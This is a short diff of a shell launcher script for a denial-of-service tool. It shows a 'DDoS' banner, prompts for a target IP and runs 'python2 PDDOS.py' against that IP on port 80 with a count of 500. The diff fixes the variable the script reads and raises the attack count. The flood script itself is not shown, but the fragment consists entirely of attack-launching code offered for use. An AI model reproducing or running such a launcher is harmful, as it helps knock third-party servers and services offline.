@@ -79,8 +79,8 @@ sleep 0.1
 clear
 figlet "DDoS" | lolcat
 echo $me IP TARGET: #0862
-read PORT #71639
+read IP #71639
 sleep 0.3
 clear
 sleep 0.3
-python2 PDDOS.py $TARGET: 80 320
+python2 PDDOS.py $IP 80 500
